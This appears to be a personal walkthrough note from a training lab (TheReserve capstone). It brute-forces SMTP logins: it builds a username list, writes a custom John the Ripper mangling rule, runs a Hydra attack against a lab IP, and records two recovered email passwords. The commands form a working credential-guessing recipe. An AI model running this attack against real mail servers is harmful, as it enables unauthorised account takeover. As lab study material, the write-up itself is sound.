
### Create a file with the names (users.txt)
**Note: Return at the end of each line.****
antony.ross	 
ashley.chan	
brenda.henderson	 
charlene.thomas 
christopher.smith 
emily.harvey 
keith.allen	 
laura.wood
leslie.morley	 
lynda.gordon	 
martin.savage	 
mohammad.ahmed	 
paula.bailey	 
rhys.parsons	 
roy.sims 

### Domain
Add domain to end of every name.

```
sed -i 's/$/@corp.thereserve.loc/' users.txt
```

![[Brute force SMTP-20240518134435690.webp]]
### Custom rules
- Add the following to the bottom of john.conf

```
	#Custom Rules

	[List.Rules:Capstone]

	Az"[0-9]" $[!@#%^]
```

- Run the following command to create a mangled passwords file.
```
john --wordlist=password_base_list.txt --rules=Capstone --stdout > mangled-passwords.txt

```

### HYDRA
Getting some email's credentials.

```
hydra -L users.txt -P mangled-passwords.txt smtp://10.200.X.11 -V -o smtp-results.txt

cat smtp-results.txt
```

![[Brute force SMTP-20240518135026786.webp]]

Email: laura.wood@corp.thereserve.loc   
Password: Password1@

Email: mohammad.ahmed@corp.thereserve.loc   
Password: Password1!

**Next step:** [[Reverse Shell]]